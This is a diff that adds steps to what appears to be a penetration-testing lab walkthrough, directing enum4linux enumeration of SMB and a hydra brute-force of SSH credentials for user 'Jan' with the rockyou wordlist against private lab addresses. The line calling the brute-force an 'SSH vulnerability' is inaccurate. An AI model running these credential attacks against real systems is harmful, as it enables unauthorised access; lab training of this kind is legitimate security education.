@@ -75,3 +75,15 @@ When you ran nikto did you find any other directories and where there any file i
 b) SMB/Windows shares
 Lets see can we find any usernames for the SMB service. 
 Task: run ```enum4linux 192.168.0.x```
+
+c) Brute Forcing SSH
+Lets seen can we brute force the SSH credentials with hydra.
+Task: run ```hydra -l Jan -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.x```
+
+💡 :Note: If you have not used the rockyou.txt wordlist before, you will have to unzip it first
+
+Task: run ```sudo gzip -d /usr/share/wordlists/rockyou.txt.gz```
+
+--> Result: TVM access is granted for Jan by exploiting a vulnerability in the SSH service.
+
+Task: ssh jan@192.168.1.x
